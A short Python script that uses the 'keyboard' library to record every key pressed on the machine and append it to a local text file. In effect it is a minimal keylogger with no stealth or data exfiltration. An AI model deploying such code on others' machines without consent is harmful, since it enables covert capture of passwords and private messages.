import keyboard

log_file = 'log_file.txt'

def onKeyboardEvent(event):
    with open(log_file, 'a') as file:
        file.write('{}\n'.format(event.name))

keyboard.on_press(onKeyboardEvent)
keyboard.wait()